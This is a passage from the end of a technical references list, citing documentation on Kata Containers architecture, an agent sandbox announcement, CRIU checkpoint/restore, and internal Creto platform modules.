   https://github.com/kata-containers/kata-containers/blob/main/docs/design/architecture/README.md

4. **Google Open Source Blog: Agent Sandbox Announcement**
   https://opensource.googleblog.com/2024/11/agent-sandbox.html

5. **CRIU (Checkpoint/Restore In Userspace)**
   https://criu.org/

6. **Creto Platform Documentation**
   (Internal: creto-nhi, creto-authz, creto-crypto, creto-audit)
